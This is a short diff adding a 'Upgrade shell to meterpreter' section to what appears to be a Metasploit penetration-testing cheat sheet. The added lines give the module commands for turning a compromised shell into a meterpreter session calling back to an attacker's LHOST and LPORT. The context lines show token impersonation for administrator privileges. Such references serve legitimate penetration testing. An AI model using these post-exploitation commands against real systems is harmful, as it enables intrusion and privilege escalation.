@@ -53,6 +53,15 @@ list_tokens -g
 impersonate_token "BUILTIN\Administrators"
 ```
 
+#### Upgrade shell to meterpreter
+```
+use multi/manage/shell_to_meterpreter
+set SESSION
+set LHOST
+set LPORT
+run
+```
+
 ## Routing
 #### Set route
 ```
